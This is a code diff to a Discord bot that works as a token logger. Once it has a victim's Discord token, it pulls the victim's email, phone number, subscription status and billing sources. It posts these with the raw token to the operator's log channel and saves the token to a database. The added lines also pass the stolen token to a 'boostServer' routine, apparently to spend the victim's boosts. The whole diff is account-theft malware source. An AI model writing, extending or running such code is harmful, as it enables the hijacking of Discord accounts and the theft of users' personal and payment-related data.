@@ -2,6 +2,7 @@ import fetch from 'node-fetch'
 import { Message, MessageEmbed, MessageAttachment, Client, TextChannel } from "discord.js";
 import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
 import { model, Schema } from 'mongoose';
+import boostServer from './util/boostServer';
 import WebSocket from "ws";
 import Jimp from "jimp";
 
@@ -83,30 +84,34 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                     if (discord.id === whitelist) return reslove(token);
                     
                 const billingInformation = await (await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, { headers: { Authorization: token } })).json();
+                const avatarUrl = discord.avatar !== null ? `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png` : `https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png`
 
                 const tokenLoggedEmbed = new MessageEmbed()
                     .setColor('#FF0000')
                     .setAuthor({
-                        name: `${discord.username}${discord.discriminator} ${discord.id}`,
-                        iconURL: `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png`
+                        name: `${discord.username}#${discord.discriminator} [${discord.id}]`,
+                        iconURL: avatarUrl
                     })
                     .addField('Account Info', `
                         Email: ${discord.email}
                         Phone: ${discord.phone}
-                        Nitro: ${discord.premium_type ? (discord.premium_type === 2 ? 'Nitro' : 'Nitro Classic') : 'None'}
+                        Nitro: ${discord.premium_type ? (discord.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}
                         Billing Info: ${billingInformation.length > 0 ? 'Yes' : 'No'}
                     `)
                     .addField('Token', token)
 
-                close();
-                (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
-                if (config.mongoose.enabled) {
-                    await users.create({
-                        id: discord.id,
-                        username: discord.username,
-                        token: token
-                    });
-                }
+                // try {
+                    if (config.boostServer) boostServer(client, token, discord);
+                    close();
+                    (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
+                    if (config.mongoose.enabled) {
+                        await users.create({
+                            id: discord.id,
+                            username: discord.username,
+                            token: token
+                        });
+                    }
+                // } catch {}
                 reslove(token);
                 break;
             default:
